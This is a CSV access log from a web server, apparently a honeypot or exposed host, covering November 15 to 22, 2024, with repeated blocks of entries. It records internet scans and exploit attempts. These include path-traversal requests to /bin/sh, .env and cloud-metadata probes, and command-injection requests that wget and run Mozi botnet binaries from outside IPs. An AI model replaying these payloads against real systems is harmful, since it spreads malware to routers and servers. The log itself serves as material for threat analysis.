ip,date,method,endpoint,status,size
198.76.125.99,16/Nov/2024:03:02:41 +0000,POST,/boaform/admin/formLogin,404,196.0
96.122.163.198,16/Nov/2024:08:36:33 +0000,GET,/cdn-cgi/trace,404,196.0
169.142.108.139,16/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
90.225.129.58,16/Nov/2024:12:55:58 +0000,GET,/favicon.ico,404,196.0
236.113.231.89,16/Nov/2024:13:03:46 +0000,GET,/cdn-cgi/trace,404,196.0
120.178.18.48,16/Nov/2024:14:04:10 +0000,POST,/apply.cgi,404,196.0
124.46.81.186,16/Nov/2024:16:32:08 +0000,,\x16\x03\x01,400,226.0
142.205.159.110,16/Nov/2024:16:39:45 +0000,GET,/cdn-cgi/trace,404,196.0
228.79.130.217,16/Nov/2024:22:57:17 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
176.232.11.35,17/Nov/2024:00:37:01 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
109.30.19.115,17/Nov/2024:00:38:31 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
127.57.86.221,17/Nov/2024:03:23:46 +0000,HEAD,/invoker/JMXInvokerServlet,404,
211.36.108.53,17/Nov/2024:03:23:52 +0000,HEAD,/web-console/ServerInfo.jsp,404,
55.140.113.75,17/Nov/2024:03:36:47 +0000,,\x16\x03\x02\x01o\x01,400,226.0
192.175.199.241,17/Nov/2024:04:26:58 +0000,GET,/.env,404,196.0
84.142.96.47,17/Nov/2024:06:02:33 +0000,GET,/shell?cd+/tmp;rm+-rf+*;wget+http://120.229.204.159:33456/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws,404,196.0
102.189.139.87,17/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
96.159.181.62,17/Nov/2024:11:17:36 +0000,,\x16\x03\x01,400,226.0
179.46.144.58,17/Nov/2024:13:13:27 +0000,,\x16\x03\x02\x01o\x01,400,226.0
132.21.2.237,17/Nov/2024:15:38:30 +0000,,\x16\x03\x02\x01o\x01,400,226.0
177.96.32.254,17/Nov/2024:16:38:32 +0000,GET,/cdn-cgi/trace,404,196.0
150.192.197.226,17/Nov/2024:16:38:36 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
91.74.36.229,17/Nov/2024:18:16:45 +0000,,\x16\x03\x01,400,226.0
78.17.228.74,17/Nov/2024:18:16:52 +0000,GET,/favicon.ico,404,196.0
148.184.51.187,17/Nov/2024:19:53:08 +0000,,\x16\x03\x03,400,226.0
171.251.110.142,17/Nov/2024:22:18:05 +0000,,\x16\x03\x01,400,226.0
100.106.199.55,18/Nov/2024:00:37:25 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
35.246.179.71,18/Nov/2024:03:22:12 +0000,GET,/favicon.ico,404,196.0
8.221.250.143,18/Nov/2024:06:54:41 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0
69.3.167.230,18/Nov/2024:07:59:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0
105.24.200.24,18/Nov/2024:08:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
196.205.52.188,18/Nov/2024:08:39:15 +0000,GET,/cdn-cgi/trace,404,196.0
135.169.179.30,18/Nov/2024:08:39:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
165.19.159.205,18/Nov/2024:08:41:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
167.131.33.210,18/Nov/2024:11:27:14 +0000,GET,/cgi-bin/index.html,404,196.0
90.159.176.69,18/Nov/2024:14:34:10 +0000,GET,/favicon.ico,404,196.0
133.172.51.161,18/Nov/2024:14:34:13 +0000,GET,/favicon.ico,404,196.0
252.27.231.130,18/Nov/2024:16:39:16 +0000,GET,/cdn-cgi/trace,404,196.0
233.7.170.105,18/Nov/2024:17:15:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0
205.48.21.65,19/Nov/2024:00:01:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0
76.192.112.106,19/Nov/2024:00:39:21 +0000,GET,/cdn-cgi/trace,404,196.0
127.143.176.37,19/Nov/2024:01:18:35 +0000,GET,/static/admin/javascript/hetong.js,404,196.0
41.188.133.71,19/Nov/2024:03:57:47 +0000,GET,/favicon.ico,404,196.0
164.9.128.216,19/Nov/2024:06:12:10 +0000,GET,/favicon.ico,404,196.0
145.87.94.18,19/Nov/2024:08:04:23 +0000,,\x16\x03\x02\x01o\x01,400,226.0
110.77.201.11,19/Nov/2024:08:34:34 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
194.91.9.177,19/Nov/2024:08:38:51 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
129.130.129.105,19/Nov/2024:11:29:01 +0000,GET,/.env,404,196.0
100.118.70.21,19/Nov/2024:14:49:13 +0000,,\x16\x03\x01\x01\xaa\x01,400,226.0
149.60.69.25,19/Nov/2024:16:22:09 +0000,GET,/login.asp,404,196.0
242.157.153.195,19/Nov/2024:16:48:00 +0000,GET,/favicon.ico,404,196.0
164.148.174.236,19/Nov/2024:20:16:26 +0000,,-,408,
114.119.144.104,20/Nov/2024:01:18:37 +0000,,\x16\x03\x01,400,226.0
151.244.20.49,20/Nov/2024:01:18:39 +0000,USER,anonymous,400,226.0
36.231.13.75,20/Nov/2024:01:24:47 +0000,GET,/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://58.208.68.190:59189/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,404,196.0
62.14.243.88,20/Nov/2024:02:51:33 +0000,,\x16\x03\x01,400,226.0
141.241.24.236,20/Nov/2024:03:11:02 +0000,CONNECT,www.google.com:443,405,224.0
83.94.39.125,20/Nov/2024:04:43:35 +0000,GET,/,400,226.0
26.145.196.221,20/Nov/2024:04:45:09 +0000,POST,/apply.cgi,404,196.0
83.25.60.222,20/Nov/2024:08:38:57 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
29.207.223.228,20/Nov/2024:10:46:29 +0000,GET,/solr/admin/info/system?wt=json,404,196.0
52.66.173.210,20/Nov/2024:11:28:11 +0000,GET,/console/,404,196.0
77.146.87.174,20/Nov/2024:13:27:37 +0000,GET,/cdn-cgi/trace,404,196.0
40.176.222.200,20/Nov/2024:13:42:45 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0
232.20.112.220,20/Nov/2024:15:27:55 +0000,GET,/favicon.ico,404,196.0
132.73.242.117,20/Nov/2024:15:28:10 +0000,GET,/WP-ADMIN,404,196.0
27.145.103.134,20/Nov/2024:17:16:39 +0000,GET,/cgi-bin/index.html,404,196.0
173.68.163.28,20/Nov/2024:17:35:27 +0000,GET,/portal/redlion,404,196.0
71.219.64.80,20/Nov/2024:18:19:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0
172.153.157.67,20/Nov/2024:20:48:24 +0000,GET,/manager/html,404,196.0
141.140.206.182,21/Nov/2024:00:22:07 +0000,,\x16\x03\x02\x01o\x01,400,226.0
94.211.242.236,21/Nov/2024:03:13:00 +0000,,\x16\x03\x01,400,226.0
21.176.111.46,21/Nov/2024:03:13:01 +0000,GET,/upl.php,404,196.0
195.145.88.149,21/Nov/2024:03:13:02 +0000,GET,/geoip/,404,196.0
11.43.136.194,21/Nov/2024:03:13:03 +0000,GET,/favicon.ico,404,196.0
37.16.234.203,21/Nov/2024:03:13:04 +0000,GET,/systembc/password.php,404,196.0
12.69.25.36,21/Nov/2024:06:57:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0
167.45.184.96,21/Nov/2024:06:58:16 +0000,,\x16\x03\x01,400,226.0
95.142.193.98,21/Nov/2024:06:58:36 +0000,,\x16\x03\x01,400,226.0
28.224.85.178,21/Nov/2024:06:58:36 +0000,GET,/aaa9,404,196.0
68.82.174.46,21/Nov/2024:08:39:59 +0000,GET,/cdn-cgi/trace,404,196.0
101.12.189.12,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
88.240.251.223,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,400,226.0
101.198.135.242,21/Nov/2024:10:42:51 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
144.203.108.48,21/Nov/2024:16:34:19 +0000,GET,/cdn-cgi/trace,404,196.0
19.6.220.247,21/Nov/2024:16:40:55 +0000,SSH,-2.0-Go,400,226.0
16.201.57.205,21/Nov/2024:16:40:55 +0000,,\x16\x03\x01,400,226.0
231.40.72.73,21/Nov/2024:17:33:20 +0000,GET,http://metadata.google.internal/computeMetadata/v1/project/,404,196.0
98.37.243.170,21/Nov/2024:20:23:09 +0000,GET,/.env,404,196.0
133.168.48.54,21/Nov/2024:22:57:32 +0000,GET,/login.asp,404,196.0
247.33.221.130,21/Nov/2024:23:02:59 +0000,,\x16\x03\x02\x01o\x01,400,226.0
77.114.9.206,22/Nov/2024:00:38:03 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
107.31.130.37,22/Nov/2024:04:13:20 +0000,,\x16\x03\x01,400,226.0
97.88.145.83,22/Nov/2024:04:59:17 +0000,GET,/_profiler/phpinfo,404,196.0
152.188.132.119,22/Nov/2024:08:34:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
78.14.172.105,22/Nov/2024:08:38:24 +0000,GET,/cdn-cgi/trace,404,196.0
109.224.254.111,22/Nov/2024:08:38:30 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
167.142.110.133,22/Nov/2024:09:19:24 +0000,,\x16\x03\x02\x01o\x01,400,226.0
236.180.232.50,22/Nov/2024:10:13:26 +0000,GET,/.env,404,196.0
137.23.141.51,22/Nov/2024:10:51:52 +0000,,\x16\x03\x02\x01o\x01,400,226.0
14.75.86.236,22/Nov/2024:13:21:34 +0000,GET,/t5Ji,404,196.0
225.45.220.251,22/Nov/2024:13:25:12 +0000,GET,/favicon.ico,404,196.0
203.117.237.196,15/Nov/2024:00:35:31 +0000,,-,408,
229.95.253.162,15/Nov/2024:00:36:08 +0000,,-,408,
91.109.35.52,15/Nov/2024:00:36:30 +0000,,-,408,
167.190.99.22,15/Nov/2024:00:36:34 +0000,,stats,400,226.0
121.136.36.27,15/Nov/2024:00:59:21 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
241.170.103.55,15/Nov/2024:06:13:35 +0000,POST,/apply.cgi,404,196.0
125.200.133.149,15/Nov/2024:09:22:38 +0000,,\x16\x03\x02\x01o\x01,400,226.0
104.163.86.218,15/Nov/2024:11:52:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0
144.76.229.251,15/Nov/2024:15:10:02 +0000,GET,/users?id=1,404,196.0
108.62.136.107,15/Nov/2024:15:10:40 +0000,GET,/user?id=1,404,196.0
196.76.212.64,15/Nov/2024:16:20:04 +0000,,\x16\x03\x02\x01o\x01,400,226.0
103.249.184.84,15/Nov/2024:16:38:28 +0000,GET,/cdn-cgi/trace,404,196.0
58.74.210.235,15/Nov/2024:20:32:25 +0000,GET,/cgi-bin/index.cgi,404,196.0
2.60.196.239,16/Nov/2024:00:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
14.120.34.237,16/Nov/2024:02:48:27 +0000,GET,/,400,226.0
66.151.102.171,16/Nov/2024:03:02:41 +0000,POST,/boaform/admin/formLogin,404,196.0
171.123.204.213,16/Nov/2024:08:36:33 +0000,GET,/cdn-cgi/trace,404,196.0
254.147.32.178,16/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
39.123.203.213,16/Nov/2024:12:55:58 +0000,GET,/favicon.ico,404,196.0
135.137.55.180,16/Nov/2024:13:03:46 +0000,GET,/cdn-cgi/trace,404,196.0
244.66.142.95,16/Nov/2024:14:04:10 +0000,POST,/apply.cgi,404,196.0
167.223.15.62,16/Nov/2024:16:32:08 +0000,,\x16\x03\x01,400,226.0
173.181.211.165,16/Nov/2024:16:39:45 +0000,GET,/cdn-cgi/trace,404,196.0
77.70.173.252,16/Nov/2024:22:57:17 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
202.228.41.211,17/Nov/2024:00:37:01 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
188.119.124.221,17/Nov/2024:00:38:31 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
200.218.240.49,17/Nov/2024:03:23:46 +0000,HEAD,/invoker/JMXInvokerServlet,404,
154.199.1.35,17/Nov/2024:03:23:52 +0000,HEAD,/web-console/ServerInfo.jsp,404,
29.185.1.142,17/Nov/2024:03:36:47 +0000,,\x16\x03\x02\x01o\x01,400,226.0
105.43.33.222,17/Nov/2024:04:26:58 +0000,GET,/.env,404,196.0
90.193.166.107,17/Nov/2024:06:02:33 +0000,GET,/shell?cd+/tmp;rm+-rf+*;wget+http://120.229.204.159:33456/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws,404,196.0
215.84.104.208,17/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
88.246.234.32,17/Nov/2024:11:17:36 +0000,,\x16\x03\x01,400,226.0
39.152.183.63,17/Nov/2024:13:13:27 +0000,,\x16\x03\x02\x01o\x01,400,226.0
16.39.238.52,17/Nov/2024:15:38:30 +0000,,\x16\x03\x02\x01o\x01,400,226.0
190.5.184.170,17/Nov/2024:16:38:32 +0000,GET,/cdn-cgi/trace,404,196.0
38.9.192.197,17/Nov/2024:16:38:36 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
26.102.187.216,17/Nov/2024:18:16:45 +0000,,\x16\x03\x01,400,226.0
39.179.32.82,17/Nov/2024:18:16:52 +0000,GET,/favicon.ico,404,196.0
187.113.25.109,17/Nov/2024:19:53:08 +0000,,\x16\x03\x03,400,226.0
80.41.76.213,17/Nov/2024:22:18:05 +0000,,\x16\x03\x01,400,226.0
61.236.26.254,18/Nov/2024:00:37:25 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
159.38.227.87,18/Nov/2024:03:22:12 +0000,GET,/favicon.ico,404,196.0
151.7.85.83,18/Nov/2024:06:54:41 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0
173.237.102.101,18/Nov/2024:07:59:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0
20.25.53.65,18/Nov/2024:08:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
27.65.47.113,18/Nov/2024:08:39:15 +0000,GET,/cdn-cgi/trace,404,196.0
19.87.203.72,18/Nov/2024:08:39:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
41.142.89.173,18/Nov/2024:08:41:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
182.42.205.29,18/Nov/2024:11:27:14 +0000,GET,/cgi-bin/index.html,404,196.0
97.52.57.13,18/Nov/2024:14:34:10 +0000,GET,/favicon.ico,404,196.0
106.13.139.121,18/Nov/2024:14:34:13 +0000,GET,/favicon.ico,404,196.0
62.205.80.250,18/Nov/2024:16:39:16 +0000,GET,/cdn-cgi/trace,404,196.0
41.97.70.22,18/Nov/2024:17:15:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0
203.24.68.134,19/Nov/2024:00:01:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0
238.223.22.132,19/Nov/2024:00:39:21 +0000,GET,/cdn-cgi/trace,404,196.0
133.242.44.239,19/Nov/2024:01:18:35 +0000,GET,/static/admin/javascript/hetong.js,404,196.0
38.124.187.35,19/Nov/2024:03:57:47 +0000,GET,/favicon.ico,404,196.0
130.134.48.108,19/Nov/2024:06:12:10 +0000,GET,/favicon.ico,404,196.0
144.78.148.83,19/Nov/2024:08:04:23 +0000,,\x16\x03\x02\x01o\x01,400,226.0
133.135.13.236,19/Nov/2024:08:34:34 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
227.55.207.186,19/Nov/2024:08:38:51 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
213.197.178.87,19/Nov/2024:11:29:01 +0000,GET,/.env,404,196.0
152.52.154.196,19/Nov/2024:14:49:13 +0000,,\x16\x03\x01\x01\xaa\x01,400,226.0
209.11.116.182,19/Nov/2024:16:22:09 +0000,GET,/login.asp,404,196.0
165.217.35.140,19/Nov/2024:16:48:00 +0000,GET,/favicon.ico,404,196.0
34.239.164.172,19/Nov/2024:20:16:26 +0000,,-,408,
186.233.116.10,20/Nov/2024:01:18:37 +0000,,\x16\x03\x01,400,226.0
138.238.50.100,20/Nov/2024:01:18:39 +0000,USER,anonymous,400,226.0
9.147.20.212,20/Nov/2024:01:24:47 +0000,GET,/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://58.208.68.190:59189/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,404,196.0
196.121.89.239,20/Nov/2024:02:51:33 +0000,,\x16\x03\x01,400,226.0
25.183.225.243,20/Nov/2024:03:11:02 +0000,CONNECT,www.google.com:443,405,224.0
10.150.243.78,20/Nov/2024:04:43:35 +0000,GET,/,400,226.0
38.9.53.233,20/Nov/2024:04:45:09 +0000,POST,/apply.cgi,404,196.0
170.100.78.215,20/Nov/2024:08:38:57 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
6.208.229.185,20/Nov/2024:10:46:29 +0000,GET,/solr/admin/info/system?wt=json,404,196.0
143.200.44.104,20/Nov/2024:11:28:11 +0000,GET,/console/,404,196.0
182.42.190.62,20/Nov/2024:13:27:37 +0000,GET,/cdn-cgi/trace,404,196.0
21.198.149.139,20/Nov/2024:13:42:45 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0
229.225.207.138,20/Nov/2024:15:27:55 +0000,GET,/favicon.ico,404,196.0
84.137.98.214,20/Nov/2024:15:28:10 +0000,GET,/WP-ADMIN,404,196.0
228.63.2.164,20/Nov/2024:17:16:39 +0000,GET,/cgi-bin/index.html,404,196.0
27.112.144.183,20/Nov/2024:17:35:27 +0000,GET,/portal/redlion,404,196.0
111.171.247.98,20/Nov/2024:18:19:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0
215.52.25.168,20/Nov/2024:20:48:24 +0000,GET,/manager/html,404,196.0
162.90.156.29,21/Nov/2024:00:22:07 +0000,,\x16\x03\x02\x01o\x01,400,226.0
123.241.19.34,21/Nov/2024:03:13:00 +0000,,\x16\x03\x01,400,226.0
171.53.184.34,21/Nov/2024:03:13:01 +0000,GET,/upl.php,404,196.0
251.64.190.130,21/Nov/2024:03:13:02 +0000,GET,/geoip/,404,196.0
47.92.165.41,21/Nov/2024:03:13:03 +0000,GET,/favicon.ico,404,196.0
217.161.100.158,21/Nov/2024:03:13:04 +0000,GET,/systembc/password.php,404,196.0
131.82.96.232,21/Nov/2024:06:57:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0
144.176.201.26,21/Nov/2024:06:58:16 +0000,,\x16\x03\x01,400,226.0
230.70.223.139,21/Nov/2024:06:58:36 +0000,,\x16\x03\x01,400,226.0
36.24.223.190,21/Nov/2024:06:58:36 +0000,GET,/aaa9,404,196.0
151.39.142.198,21/Nov/2024:08:39:59 +0000,GET,/cdn-cgi/trace,404,196.0
31.1.204.173,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
189.180.231.79,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,400,226.0
120.138.106.92,21/Nov/2024:10:42:51 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
152.68.201.211,21/Nov/2024:16:34:19 +0000,GET,/cdn-cgi/trace,404,196.0
212.109.96.196,21/Nov/2024:16:40:55 +0000,SSH,-2.0-Go,400,226.0
39.240.106.171,21/Nov/2024:16:40:55 +0000,,\x16\x03\x01,400,226.0
160.80.173.215,21/Nov/2024:17:33:20 +0000,GET,http://metadata.google.internal/computeMetadata/v1/project/,404,196.0
214.31.44.67,21/Nov/2024:20:23:09 +0000,GET,/.env,404,196.0
45.236.115.183,21/Nov/2024:22:57:32 +0000,GET,/login.asp,404,196.0
118.66.107.45,21/Nov/2024:23:02:59 +0000,,\x16\x03\x02\x01o\x01,400,226.0
115.65.87.178,22/Nov/2024:00:38:03 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
25.242.93.217,22/Nov/2024:04:13:20 +0000,,\x16\x03\x01,400,226.0
58.175.114.77,22/Nov/2024:04:59:17 +0000,GET,/_profiler/phpinfo,404,196.0
95.240.34.70,22/Nov/2024:08:34:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
29.177.233.56,22/Nov/2024:08:38:24 +0000,GET,/cdn-cgi/trace,404,196.0
158.252.63.71,22/Nov/2024:08:38:30 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
21.15.133.163,22/Nov/2024:09:19:24 +0000,,\x16\x03\x02\x01o\x01,400,226.0
26.11.68.231,22/Nov/2024:10:13:26 +0000,GET,/.env,404,196.0
183.201.93.84,22/Nov/2024:10:51:52 +0000,,\x16\x03\x02\x01o\x01,400,226.0
26.227.118.174,22/Nov/2024:13:21:34 +0000,GET,/t5Ji,404,196.0
45.112.97.218,22/Nov/2024:13:25:12 +0000,GET,/favicon.ico,404,196.0
139.177.240.86,15/Nov/2024:00:35:31 +0000,,-,408,
115.201.220.239,15/Nov/2024:00:36:08 +0000,,-,408,
136.173.196.105,15/Nov/2024:00:36:30 +0000,,-,408,
172.201.219.136,15/Nov/2024:00:36:34 +0000,,stats,400,226.0
165.191.7.56,15/Nov/2024:00:59:21 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
108.231.112.193,15/Nov/2024:06:13:35 +0000,POST,/apply.cgi,404,196.0
163.229.232.28,15/Nov/2024:09:22:38 +0000,,\x16\x03\x02\x01o\x01,400,226.0
42.203.30.93,15/Nov/2024:11:52:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0
188.193.23.18,15/Nov/2024:15:10:02 +0000,GET,/users?id=1,404,196.0
19.23.199.64,15/Nov/2024:15:10:40 +0000,GET,/user?id=1,404,196.0
110.109.129.225,15/Nov/2024:16:20:04 +0000,,\x16\x03\x02\x01o\x01,400,226.0
42.84.251.219,15/Nov/2024:16:38:28 +0000,GET,/cdn-cgi/trace,404,196.0
24.14.164.172,15/Nov/2024:20:32:25 +0000,GET,/cgi-bin/index.cgi,404,196.0
30.207.229.230,16/Nov/2024:00:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
200.234.29.62,16/Nov/2024:02:48:27 +0000,GET,/,400,226.0
143.253.163.12,16/Nov/2024:03:02:41 +0000,POST,/boaform/admin/formLogin,404,196.0
11.62.80.103,16/Nov/2024:08:36:33 +0000,GET,/cdn-cgi/trace,404,196.0
119.63.45.157,16/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
8.157.114.206,16/Nov/2024:12:55:58 +0000,GET,/favicon.ico,404,196.0
186.65.97.75,16/Nov/2024:13:03:46 +0000,GET,/cdn-cgi/trace,404,196.0
89.3.94.43,16/Nov/2024:14:04:10 +0000,POST,/apply.cgi,404,196.0
8.94.123.80,16/Nov/2024:16:32:08 +0000,,\x16\x03\x01,400,226.0
24.34.57.50,16/Nov/2024:16:39:45 +0000,GET,/cdn-cgi/trace,404,196.0
220.237.39.18,16/Nov/2024:22:57:17 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
54.177.149.20,17/Nov/2024:00:37:01 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
37.51.193.110,17/Nov/2024:00:38:31 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
73.61.67.165,17/Nov/2024:03:23:46 +0000,HEAD,/invoker/JMXInvokerServlet,404,
224.131.17.133,17/Nov/2024:03:23:52 +0000,HEAD,/web-console/ServerInfo.jsp,404,
172.136.232.115,17/Nov/2024:03:36:47 +0000,,\x16\x03\x02\x01o\x01,400,226.0
183.75.233.24,17/Nov/2024:04:26:58 +0000,GET,/.env,404,196.0
150.41.20.125,17/Nov/2024:06:02:33 +0000,GET,/shell?cd+/tmp;rm+-rf+*;wget+http://120.229.204.159:33456/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws,404,196.0
39.75.89.76,17/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
73.134.11.162,17/Nov/2024:11:17:36 +0000,,\x16\x03\x01,400,226.0
145.227.76.115,17/Nov/2024:13:13:27 +0000,,\x16\x03\x02\x01o\x01,400,226.0
242.127.190.187,17/Nov/2024:15:38:30 +0000,,\x16\x03\x02\x01o\x01,400,226.0
55.139.204.161,17/Nov/2024:16:38:32 +0000,GET,/cdn-cgi/trace,404,196.0
168.126.179.74,17/Nov/2024:16:38:36 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
92.71.226.223,17/Nov/2024:18:16:45 +0000,,\x16\x03\x01,400,226.0
89.45.226.101,17/Nov/2024:18:16:52 +0000,GET,/favicon.ico,404,196.0
140.217.115.200,17/Nov/2024:19:53:08 +0000,,\x16\x03\x03,400,226.0
167.216.211.181,17/Nov/2024:22:18:05 +0000,,\x16\x03\x01,400,226.0
86.153.214.219,18/Nov/2024:00:37:25 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
72.183.11.34,18/Nov/2024:03:22:12 +0000,GET,/favicon.ico,404,196.0
209.30.57.110,18/Nov/2024:06:54:41 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0
232.26.244.126,18/Nov/2024:07:59:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0
53.183.254.191,18/Nov/2024:08:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
39.28.213.218,18/Nov/2024:08:39:15 +0000,GET,/cdn-cgi/trace,404,196.0
167.121.183.25,18/Nov/2024:08:39:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
79.86.33.0,18/Nov/2024:08:41:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
82.24.13.23,18/Nov/2024:11:27:14 +0000,GET,/cgi-bin/index.html,404,196.0
198.113.245.162,18/Nov/2024:14:34:10 +0000,GET,/favicon.ico,404,196.0
52.140.114.120,18/Nov/2024:14:34:13 +0000,GET,/favicon.ico,404,196.0
193.24.252.193,18/Nov/2024:16:39:16 +0000,GET,/cdn-cgi/trace,404,196.0
238.22.141.238,18/Nov/2024:17:15:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0
188.78.225.133,19/Nov/2024:00:01:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0
